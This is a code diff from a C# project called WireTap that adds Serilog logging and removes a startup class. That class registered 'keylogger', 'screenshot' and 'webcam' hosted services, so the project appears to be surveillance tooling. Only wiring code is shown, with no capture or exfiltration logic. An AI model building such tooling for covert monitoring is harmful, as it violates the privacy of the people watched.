@@ -1,10 +1,10 @@
 namespace WireTap.HostedService
 {
-    using Microsoft.Extensions.DependencyInjection;
     using Microsoft.Extensions.Hosting;
+    using Serilog;
     using System;
-    using System.Collections.Generic;
     using System.Threading.Tasks;
+    using WireTap.Logging;
 
     public class Program
     {
@@ -20,7 +20,8 @@ namespace WireTap.HostedService
             try
             {
                 var host = Host.CreateDefaultBuilder(args)
-                      .ConfigureServices((hostContext, services) => services.ConfigureServices())
+                      .ConfigureServices((_, services) => services.ConfigureServices())
+                      .UseSerilog((_, config) => config.ConfigureLogger())
                       .Build();
 
                 try
@@ -36,39 +37,6 @@ namespace WireTap.HostedService
             {
                 Console.WriteLine(ex.Message);
             }
-        }
-    }
-
-    public static class Startup
-    {
-        private static class ServiceRegistrar
-        {
-            public static Dictionary<string, Action<IServiceCollection>> ServiceRegistrations;
-
-            static ServiceRegistrar()
-            {
-                ServiceRegistrations = new Dictionary<string, Action<IServiceCollection>>
-                {
-                    {  "keylogger", services => services.AddHostedService<KeyloggerService>()   },
-                    { "screenshot", services => services.AddHostedService<ScreenshotService>()  },
-                    {     "webcam", services => services.AddHostedService<WebcamService>()      }
-                };
-            }
-        }
-
-        public static IServiceCollection ConfigureServices(this IServiceCollection services)
-        {
-            services.AddHostedService();
-
-            return services;
-        }
-
-        public static IServiceCollection AddHostedService(this IServiceCollection services)
-        {
-            var serviceRegistration = ServiceRegistrar.ServiceRegistrations[Program.ServiceName];
-            serviceRegistration(services);
-
-            return services;
         }
     }
 }
